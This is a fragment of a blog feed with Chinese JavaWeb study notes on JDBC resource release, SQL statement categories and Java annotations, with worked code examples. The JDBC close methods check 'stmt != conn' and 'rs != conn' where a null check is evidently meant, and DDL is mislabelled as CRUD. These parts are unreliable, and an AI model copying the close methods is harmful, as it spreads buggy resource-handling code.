class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(Statement stmt, Connection conn)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stmt != conn)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stmt.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//释放方法2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ResultSet rs, Statement stmt, Connection conn)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rs != conn)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            rs.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stmt != conn)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stmt.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;jdbc操作&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#jdbc操作&quot;&gt;&lt;/a&gt; JDBC操作&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;基本概念&lt;/li&gt;
&lt;li&gt;快速入门&lt;/li&gt;
&lt;li&gt;对JDBC中各个接口和类详解&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="java" scheme="https://joe1sn.eu.org/categories/notes/java/"/>
    
    
    <category term="Java" scheme="https://joe1sn.eu.org/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb笔记-数据库</title>
    <link href="https://joe1sn.eu.org/2022/03/18/java-d2-database/"/>
    <id>https://joe1sn.eu.org/2022/03/18/java-d2-database/</id>
    <published>2022-03-18T08:26:12.000Z</published>
    <updated>2022-09-20T08:03:46.760Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="javaweb笔记-数据库"><a class="markdownIt-Anchor" href="#javaweb笔记-数据库"></a> JavaWeb笔记-数据库</h1><h2 id="sql分类"><a class="markdownIt-Anchor" href="#sql分类"></a> SQL分类</h2><ol><li><p>数据查询语言（DQL）<br />数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。保留字SELECT是DQL（也是所有SQL）用得最多的动词，其他DQL常用的保留字有FROM，WHERE，GROUP BY，HAVING和ORDER BY。这些DQL保留字常与其他类型的SQL语句一起使用。</p></li><li><p>数据定义语言（DDL）(<strong>CRUD</strong>)<br />数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由CREATE、ALTER与DROP三个语法所组成，最早是由 Codasyl (Conference on Data Systems Languages) 数据模型开始，现在被纳入 SQL 指令中作为其中一个子集。</p></li><li><p>数据操纵语言（DML）<br />数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除。</p></li><li><p>数据控制语言（DCL）<br />数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。由 GRANT 和 REVOKE 两个指令组成。DCL以控制用户的访问权限为主，GRANT为授权语句，对应的REVOKE是撤销授权语句。</p></li><li><p>指针控制语言（CCL）<br />它的语句，像DECLARE CURSOR，FETCH INTO和UPDATE WHERE CURRENT用于对一个或多个表单独行的操作。</p></li><li><p>事务处理语言（TPL）<br />它的语句能确保被DML语句影响的表的所有行及时得以更新。TPL语句包括BEGIN TRANSACTION，COMMIT和ROLLBACK。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;h1 id=&quot;javaweb笔记-数据库&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#javaweb笔记-数据库&quot;&gt;&lt;/a&gt; JavaWeb笔记-数据库&lt;/h1&gt;
&lt;h2 id=&quot;sql分类&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="java" scheme="https://joe1sn.eu.org/categories/notes/java/"/>
    
    
    <category term="Java" scheme="https://joe1sn.eu.org/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb笔记-注解</title>
    <link href="https://joe1sn.eu.org/2022/03/16/java-d1-annotation/"/>
    <id>https://joe1sn.eu.org/2022/03/16/java-d1-annotation/</id>
    <published>2022-03-16T12:49:29.000Z</published>
    <updated>2022-09-21T04:28:46.667Z</updated>
    
    <content type="html"><![CDATA[<p>注释部分</p><span id="more"></span><h2 id="注解"><a class="markdownIt-Anchor" href="#注解"></a> 注解</h2><p><strong>概念</strong>：说明程序。For计算机</p><blockquote><p><strong>从JDK1.5开始，Java增加对元数据的支持</strong>，也就是注解，注解与注释是有一定区别的，可以把注解理解为代码里的特殊标记，<strong>这些标记可以在编译，类加载，运行时被读取</strong>，并执行相应的处理。通过注解开发人员可以在不改变原有代码和逻辑的情况下在源代码中嵌入补充信息。</p></blockquote><blockquote><p>注释：用文字描述程序。For程序员</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/eddfbc89d08cbd1cf6c61e1a3bcd242f.jpg" alt="" /></p><h2 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h2><ol><li><p>编写文档：标识生成doc文档</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.annotation;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注解 java doc演示</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.5 </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> joe1sn</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnnoDemo1</span> &#123;</span><br><span class="line">    <span class="comment">//计算两数之和</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>javadoc AnnoDemo1.java -encoding UTF-8 -charset UTF-8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">正在加载源文件AnnoDemo1.java...</span><br><span class="line">正在构造 Javadoc 信息...</span><br><span class="line">标准 Doclet 版本 1.8.0_301</span><br><span class="line">正在构建所有程序包和类的树...</span><br><span class="line">正在生成.\AnnoDemo1.html...</span><br><span class="line">正在生成.\package-frame.html...</span><br><span class="line">正在生成.\package-summary.html...</span><br><span class="line">正在生成.\package-tree.html...</span><br><span class="line">正在生成.\constant-values.html...</span><br><span class="line">正在构建所有程序包和类的索引...</span><br><span class="line">正在生成.\overview-tree.html...</span><br><span class="line">正在生成.\index-all.html...</span><br><span class="line">正在生成.\deprecated-list.html...</span><br><span class="line">正在构建所有类的索引...</span><br><span class="line">正在生成.\allclasses-frame.html...</span><br><span class="line">正在生成.\allclasses-noframe.html...</span><br><span class="line">正在生成.\index.html...</span><br><span class="line">正在生成.\help-doc.html...</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/824030c0e01f1b9d908641eb1c531649.png" alt="image-20220317110445576" /></p></li><li><p>代码检查：代码分析（使用反射）</p><p>例子： <strong>@Override</strong></p><p>也可以自定义注解【使用反射】</p></li><li><p>让编译器实现基本的检查</p></li></ol><h2 id="jdk预定义注解"><a class="markdownIt-Anchor" href="#jdk预定义注解"></a> JDK预定义注解</h2><ol><li><p><strong>@Override</strong></p><p>编译检查，检查被标记方法是否是被父类覆写的方法</p><p><img src="https://img.joe1sn.top/uploads/big/d22da63fa06a2ff90c7fd341620b6694.png" alt="image-20220316205850409" /></p></li><li><p><strong>@Deprecated</strong></p><p>该注解内容已过时</p><p><img src="https://img.joe1sn.top/uploads/big/553ce0833380809c33a8c6367e51e9fe.png" alt="image-20220317111415161" /></p><p><img src="https://img.joe1sn.top/uploads/big/692186f911683d1e667c555ea00aebeb.png" alt="image-20220317111514278" /></p></li><li><p><strong>@SuppressWarnings</strong></p><p>压制警告，需要传参，一般传递&quot;all&quot;压制所有警告</p><p><img src="https://img.joe1sn.top/uploads/big/33fb9bf43b067d9eafaf9c9f8fbc0f18.png" alt="image-20220317111629903" /></p><p><img src="https://img.joe1sn.top/uploads/big/bd29498aa83737f8eb253b185c412e95.png" alt="" /></p></li></ol><p><strong>自定义注解及使用(解析)</strong></p><p><strong>格式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.SOURCE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Override &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">元注解</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> 注解名称&#123;</span><br><span class="line">    属性列表</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a0bfe62d40a309e36f5822ea1ddf0751.png" alt="image-20220317205535179" /></p><p><strong>本质</strong>：注解本质上就是一个接口，接口默认继承Annotation()</p><p><img src="https://img.joe1sn.top/uploads/big/dc07bb2fa1d18d4faae9377a7f74222c.png" alt="image-20220317205755742" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyAnno</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.annotation.Annotation &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>属性</strong>：接口中可以定义的成员方法</p><ul><li><p>要求：</p><ol><li><p>属性返回类型</p><ul><li>基本数据类型</li><li>String</li><li>枚举</li><li>注解</li><li>以上类型数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">show1</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">show2</span><span class="params">()</span>;</span><br><span class="line">    Person <span class="title function_">per</span><span class="params">()</span>;   <span class="comment">//枚举</span></span><br><span class="line">    MyAnno2 <span class="title function_">anno2</span><span class="params">()</span>;<span class="comment">//注解</span></span><br><span class="line">    String[] strs();<span class="comment">//字符串数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>定义的属性在使用时需要给属性赋值</p><p>缺少赋值：</p><p><img src="https://img.joe1sn.top/uploads/big/5190e30a9f7de7721cae0b5e8ed8edb3.png" alt="image-20220317210750659" /></p><p>只留下show1进行赋值</p><p><img src="https://img.joe1sn.top/uploads/big/76ca396dd0a1f0648ff03f48ef821ec5.png" alt="image-20220317210854025" /></p><p>默认赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;Doe&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只有一个属性需要赋值，如果属性名称是value，直接赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.annotation;</span><br><span class="line"></span><br><span class="line"><span class="meta">@MyAnno(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Worker</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于枚举、注解、字符串的注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MyAnno(age=1,</span></span><br><span class="line"><span class="meta">        per=Person.P1,</span></span><br><span class="line"><span class="meta">        anno2=@MyAnno2,</span></span><br><span class="line"><span class="meta">//        strs=&#123;&quot;1&quot;,&quot;a&quot;,&quot;v&quot;&#125;</span></span><br><span class="line"><span class="meta">        strs = &quot;abcdefg&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Worker</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><p><strong>元注解</strong>：用于描述注解的注解</p><ul><li><p>@Target：描述注解能够作用的位置</p><p>ElementType取值：</p><ul><li>TYPE：作用于类上</li><li>METHOD：作用于方法上</li><li>FIELD：作用于成员变量上</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//表示anno3注解只能作用于类上</span></span><br><span class="line"><span class="meta">@Target(value = &#123;</span></span><br><span class="line"><span class="meta">        ElementType.TYPE,</span></span><br><span class="line"><span class="meta">        ElementType.METHOD,</span></span><br><span class="line"><span class="meta">        ElementType.FIELD</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno3 &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>@Retention：描述注解能被保留的阶段</p><p>RetentionPolicy：判断在哪个阶段，使用该注解</p><ol><li>SOURCE</li><li>CLASS</li><li>RUNTIME（一般使用这个）：会保留到class字节码文件中，并被JVM读取到</li></ol></li><li><p>@Documented：描述注解是否被抽取到api文档中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MyAnno3</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Worker</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John&quot;</span>;</span><br><span class="line">    <span class="meta">@MyAnno3</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> - <span class="doctag">@Target</span>：描述注解能够作用的位置</span></span><br><span class="line"><span class="comment"> - <span class="doctag">@Retention</span>：描述注解能被保留的阶段</span></span><br><span class="line"><span class="comment"> - <span class="doctag">@Documented</span>：描述注解是否被抽取到api文档中</span></span><br><span class="line"><span class="comment"> - <span class="doctag">@Inherited</span>：描述注解是否这子类继承</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//表示anno3注解只能作用于类上</span></span><br><span class="line"><span class="meta">@Target(value = &#123;</span></span><br><span class="line"><span class="meta">        ElementType.TYPE,</span></span><br><span class="line"><span class="meta">        ElementType.METHOD,</span></span><br><span class="line"><span class="meta">        ElementType.FIELD</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno3 &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://img.joe1sn.top/uploads/big/55ec7742b3dfd3a6307eab6c0fbfeb65.png" alt="image-20220317213546637" style="zoom:50%;" /><p>删除该注解后</p><p><img src="https://img.joe1sn.top/uploads/big/a5887fe0ae0e2f8ba715f092e921dbe5.png" alt="image-20220317213717359" /></p></li><li><p>@Inherited：描述注解是否被子类继承</p></li></ul><h2 id="解析注解"><a class="markdownIt-Anchor" href="#解析注解"></a> 解析注解</h2><p>将配置文件的工作交给注解完成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 描述需要执行的类名和方法名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Pro &#123;</span><br><span class="line">    String <span class="title function_">className</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">method</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> LearnJunit.reflect.ReflectDemo1;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">//假设框架类</span></span><br><span class="line"><span class="meta">@Pro(className = &quot;LearnJunit.annotation.Demo1&quot;,</span></span><br><span class="line"><span class="meta">        method = &quot;show&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectFramework</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1.解析注解</span></span><br><span class="line">        <span class="comment">//  获取该类的字节码文件对象</span></span><br><span class="line">        Class&lt;ReflectFramework&gt; reflectFrameworkClass = ReflectFramework.class;</span><br><span class="line">        <span class="comment">//2.获得注解对象</span></span><br><span class="line">        <span class="comment">//  内存中生成了该注解接口的 子类实现对象</span></span><br><span class="line">        <span class="type">Pro</span> <span class="variable">an</span> <span class="operator">=</span> reflectFrameworkClass.getAnnotation(Pro.class);</span><br><span class="line">        <span class="comment">//3.调用注解对象中定义的抽象方法，获取返回值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> an.className();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于步骤2，在 21行下个断点</p><p><img src="https://img.joe1sn.top/uploads/big/d35c50f49cf1c60cb715378fd3d6b3ad.png" alt="image-20220318104234263" /></p><p>这个时候注解相关的都还没有对应数据，但是获得了注解(<code>.getAnnotation</code>)对象后</p><p><img src="https://img.joe1sn.top/uploads/big/2772d124590eb9c47998ee09e53de0a2.png" alt="image-20220318104558428" /></p><p>不仅<code>reflectFrameworkClass</code>注解有了值，而且在内存中多出了一个<code>an</code>变量，而<code>an</code>就是我们注解的内容</p><p>最后加上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4.反射获得类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"><span class="comment">//5.获得类的方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">aMethod</span> <span class="operator">=</span> aClass.getMethod(methodName);</span><br><span class="line"><span class="comment">//6.调用方法</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">aObject</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">aMethod.invoke(aObject);</span><br></pre></td></tr></table></figure><p>就能使用注解中的类的对应方法了</p><p><img src="https://img.joe1sn.top/uploads/big/043e3d7d89bd90901e4b29981c43aed9.png" alt="image-20220318105703388" /></p><p><img src="https://img.joe1sn.top/uploads/big/9ec7243bbbb505cc94160fd5b7748d06.png" alt="image-20220318105745302" /></p><h2 id="案例"><a class="markdownIt-Anchor" href="#案例"></a> 案例</h2><p>测试类</p><p><code>LearnJunit.annotation.demo.Calculator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.annotation.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="meta">@check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1 + 0 = &quot;</span> + (<span class="number">1</span> + <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1 - 0 = &quot;</span> + (<span class="number">1</span> - <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mul</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1 * 0 = &quot;</span> + (<span class="number">1</span> * <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">div</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1 / 0 = &quot;</span> + (<span class="number">1</span> / <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;always normal&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试注解</p><p><code>LearnJunit.annotation.demo.check</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LearnJunit.annotation.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> check &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试方法</p><p><code>LearnJunit.annotation.demo.testCheck</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 